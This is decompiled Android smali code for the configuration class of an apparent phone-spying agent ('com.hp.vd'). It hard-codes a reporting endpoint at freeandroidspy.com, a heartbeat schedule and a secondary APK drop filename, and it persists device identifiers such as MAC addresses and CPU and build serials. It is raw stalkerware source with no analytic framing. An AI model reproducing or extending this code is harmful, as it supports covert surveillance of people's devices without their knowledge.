.class public Lcom/hp/vd/agent/Configuration;
.super Ljava/lang/Object;
.source "Configuration.java"


# static fields
.field public static final DEFAULT_ENDPOINT:Ljava/lang/String; = "https://server.freeandroidspy.com:443/index.php"

.field public static final PREF_KEY_ENDPOINT:Ljava/lang/String; = "server_endpoint"


# instance fields
.field protected defaultHeartbeatInterval:I

.field protected defaultInitialWakeupDelay:I

.field protected secondaryApplicationDefaultDropFilename:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const-string v0, "inputfacility.apk"

    .line 22
    iput-object v0, p0, Lcom/hp/vd/agent/Configuration;->secondaryApplicationDefaultDropFilename:Ljava/lang/String;

    const/16 v0, 0x78

    .line 92
    iput v0, p0, Lcom/hp/vd/agent/Configuration;->defaultInitialWakeupDelay:I

    const/16 v0, 0x12c

    .line 113
    iput v0, p0, Lcom/hp/vd/agent/Configuration;->defaultHeartbeatInterval:I

    return-void
.end method


# virtual methods
.method public getBuildPackageName()Ljava/lang/String;
    .locals 1

    const-string v0, "com.hp.vd"

    return-object v0
.end method

.method public getBuildVariant()Ljava/lang/String;
    .locals 1

    const-string v0, "4474_10032021"

    return-object v0
.end method

.method public getDefaultHeartbeatInterval()I
    .locals 1

    .line 191
    iget v0, p0, Lcom/hp/vd/agent/Configuration;->defaultHeartbeatInterval:I

    return v0
.end method

.method public getDefaultInitialWakeupInterval()I
    .locals 1

    .line 186
    iget v0, p0, Lcom/hp/vd/agent/Configuration;->defaultInitialWakeupDelay:I

    return v0
.end method

.method public getEndpoints(Landroid/content/Context;)[Ljava/net/URI;
    .locals 7

    const/4 v0, 0x1

    .line 173
    new-array v0, v0, [Ljava/net/URI;

    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;

    const/4 v2, 0x0

    if-eqz p1, :cond_1

    const-string v3, "system"

    const/4 v4, 0x0


    .line 174
    invoke-virtual {p1, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    if-eqz v3, :cond_1

    sget-object v4, Lcom/hp/vd/agent/Configuration;->PREF_KEY_ENDPOINT:Ljava/lang/String;

    const-string v5, ""

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_1

    move-object v1, v3

    :cond_1
    :try_start_0
    invoke-static {v1}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0

    aput-object v3, v0, v2

    goto :goto_0

    :catch_0
    move-exception v3

    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;

    invoke-static {v1}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;

    move-result-object v1

    aput-object v1, v0, v2

    :goto_0
    return-object v0
.end method

.method public getSecondaryApplicationDefaultDropFilename()Ljava/lang/String;
    .locals 1

    .line 131
    iget-object v0, p0, Lcom/hp/vd/agent/Configuration;->secondaryApplicationDefaultDropFilename:Ljava/lang/String;

    return-object v0
.end method

.method public getVersion()D
    .locals 2

    const-wide v0, 0x400c3d70a3d70a3dL    # 3.53

    return-wide v0
.end method

.method public getVersionCodename()Ljava/lang/String;
    .locals 1

    const-string v0, "3.53"

    return-object v0
.end method

.method public loadSystemData(Landroid/content/Context;)Lcom/hp/vd/data/SystemData;
    .locals 5

    .line 200
    new-instance v0, Lcom/hp/vd/data/SystemData;

    invoke-direct {v0}, Lcom/hp/vd/data/SystemData;-><init>()V

    const-string v1, "system"

    const/4 v2, 0x0

    .line 202
    invoke-virtual {p1, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    const/4 v1, 0x3

    .line 211
    new-array v1, v1, [Ljava/lang/String;

    const-string v3, "identifier"

    aput-object v3, v1, v2

    const-string v3, "initial_wakeup_delay"

    const/4 v4, 0x1

    aput-object v3, v1, v4

    const-string v3, "heartbeat_interval"

    const/4 v4, 0x2

    aput-object v3, v1, v4

    .line 218
    array-length v3, v1

    :goto_0
    if-ge v2, v3, :cond_1

    aget-object v4, v1, v2

    .line 219
    invoke-interface {p1, v4}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_0

    const/4 p1, 0x0

    return-object p1

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 228
    :cond_1
    invoke-virtual {p0}, Lcom/hp/vd/agent/Configuration;->getVersion()D

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->version:Ljava/lang/Double;

    .line 229
    invoke-virtual {p0}, Lcom/hp/vd/agent/Configuration;->getVersionCodename()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->versionCodename:Ljava/lang/String;

    const-string v1, "identifier"

    const-string v2, "__CANNOT_BE_LOADED__"

    .line 231
    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->identifier:Ljava/lang/String;

    const-string v1, "identifier_plain"

    const-string v2, "__CANNOT_BE_LOADED__"

    .line 232
    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->identifierPlain:Ljava/lang/String;

    const-string v1, "build_serial"

    const-string v2, "__CANNOT_BE_LOADED__"

    .line 233
    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->buildSerial:Ljava/lang/String;

    const-string v1, "wifi_mac_address"

    const-string v2, "__CANNOT_BE_LOADED__"

    .line 234
    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->wifiMacAddress:Ljava/lang/String;

    const-string v1, "bluetooth_mac_address"

    const-string v2, "__CANNOT_BE_LOADED__"

    .line 235
    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->bluetoothMacAddress:Ljava/lang/String;

    const-string v1, "cpu_serial"

    const-string v2, "__CANNOT_BE_LOADED__"

    .line 236
    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->cpuSerial:Ljava/lang/String;

    const-string v1, "instance"

    const-string v2, "__CANNOT_BE_LOADED__"

    .line 238
    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->instance:Ljava/lang/String;

    const-string v1, "session"

    const-string v2, "__CANNOT_BE_LOADED__"

    .line 239
    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->session:Ljava/lang/String;

    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;

    sget-object v2, Lcom/hp/vd/agent/Configuration;->PREF_KEY_ENDPOINT:Ljava/lang/String;

    const-string v3, ""

    invoke-interface {p1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_2

    move-object v1, v2

    :cond_2
    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->endpoint:Ljava/lang/String;

    const-string v1, "initial_wakeup_delay"

    .line 241
    invoke-virtual {p0}, Lcom/hp/vd/agent/Configuration;->getDefaultInitialWakeupInterval()I

    move-result v2

    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->initialWakeupDelay:Ljava/lang/Integer;

    const-string v1, "heartbeat_interval"

    .line 242
    invoke-virtual {p0}, Lcom/hp/vd/agent/Configuration;->getDefaultHeartbeatInterval()I

    move-result v2

    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->heartbeatInterval:Ljava/lang/Integer;

    .line 244
    new-instance v1, Ljava/util/Date;

    const-string v2, "installed_on"

    new-instance v3, Ljava/util/Date;

    invoke-direct {v3}, Ljava/util/Date;-><init>()V

    invoke-virtual {v3}, Ljava/util/Date;->getTime()J

    move-result-wide v3

    invoke-interface {p1, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    invoke-direct {v1, v2, v3}, Ljava/util/Date;-><init>(J)V

    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->installedOn:Ljava/util/Date;

    return-object v0
.end method

.method public saveSystemData(Landroid/content/Context;Lcom/hp/vd/data/SystemData;)Z
    .locals 3

    const-string v0, "system"

    const/4 v1, 0x0

    .line 251
    invoke-virtual {p1, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    .line 256
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string v0, "identifier"

    .line 258
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->identifier:Ljava/lang/String;

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "identifier_plain"

    .line 259
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->identifierPlain:Ljava/lang/String;

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "build_serial"

    .line 260
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->buildSerial:Ljava/lang/String;

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "wifi_mac_address"

    .line 262
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->wifiMacAddress:Ljava/lang/String;

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "bluetooth_mac_address"

    .line 263
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->bluetoothMacAddress:Ljava/lang/String;

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "cpu_serial"

    .line 264
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->cpuSerial:Ljava/lang/String;

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "instance"

    .line 266
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->instance:Ljava/lang/String;

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "session"

    .line 267
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->session:Ljava/lang/String;

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "initial_wakeup_delay"

    .line 273
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->initialWakeupDelay:Ljava/lang/Integer;

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "heartbeat_interval"

    .line 274
    iget-object v1, p2, Lcom/hp/vd/data/SystemData;->heartbeatInterval:Ljava/lang/Integer;

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "installed_on"

    .line 276
    iget-object p2, p2, Lcom/hp/vd/data/SystemData;->installedOn:Ljava/util/Date;

    invoke-virtual {p2}, Ljava/util/Date;->getTime()J

    move-result-wide v1

    invoke-interface {p1, v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 278
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1
.end method
